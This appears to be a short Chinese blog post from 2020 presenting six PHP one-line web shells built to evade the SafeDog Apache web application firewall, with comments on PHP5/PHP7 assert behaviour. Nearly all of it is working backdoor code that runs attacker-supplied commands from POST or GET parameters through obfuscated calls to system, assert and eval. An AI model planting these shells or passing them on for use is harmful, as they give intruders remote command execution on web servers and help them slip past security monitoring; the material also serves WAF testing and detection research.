---

# [2020/08/01]PHP一句话过狗

测试环境：

windows7

phpstudy8.1.0.1

网站安全狗(APACHE版)V4.0正式版

## 1.array

```php
<?php
    //PHP7
    $a = array('0xxxx','sys');
    $b = array('tem','ssss');
    ($a[1].$b[0])($_POST['a']);
?>
```

## 2.

```php
<?php
    //PHP5
    $a="assert";
    @"${$a($_POST['a'])}";
?>
```

## 3.ini_get

```php
<?php
    //PHP7
    ini_set("open_basedir",$_POST['a']);//"system");
    ini_get("open_basedir")($_POST['b']);//("net user");
?>
```

## 4.__call

```php
<?php
    //PHP5
    class evil{function __call($O,$o){$O($_POST['a']);}}
    $v = new evil();
    $v->assert();
?>
```

## 5.define

```php
<?php
    //PHP7
    @define("PHP",$_POST['a']);
    @define("FIVE","system",true);
    @constant("FiVe")/*sfdf*/(PHP);
?>
```

## 6 assert

```php
<?php
//PHP5,7
$_ = $_GET['a'];
$b = "eval";
function a($a){return @assert($a);}
a("@$b(\"$_\")");
?>
```

​	熟悉的assert在PHP7中又回来了。然而有趣的是完整的assert检测不出来，拆分成"ass"."ert"时反而被检测出来了

在PHP7配置文件php.ini中zend.assertions=1时可以执行PHP代码，windows下默认等于1，Linux下默认等于-1

![image-20200801134629197](images/image-20200801134629197.png)

目前就这么多了